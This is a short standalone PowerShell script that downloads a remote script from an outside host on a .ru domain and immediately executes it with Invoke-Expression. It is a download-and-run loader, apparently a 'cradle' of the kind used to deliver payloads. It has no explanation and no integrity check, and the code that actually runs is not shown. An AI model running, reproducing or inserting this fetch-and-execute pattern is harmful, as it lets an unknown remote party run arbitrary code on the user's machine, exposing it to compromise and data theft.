[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$wc = New-Object System.Net.WebClient
$wc.Encoding = [System.Text.Encoding]::UTF8
Invoke-Expression $wc.DownloadString("https://vsemap.ru/ps/core.ps1")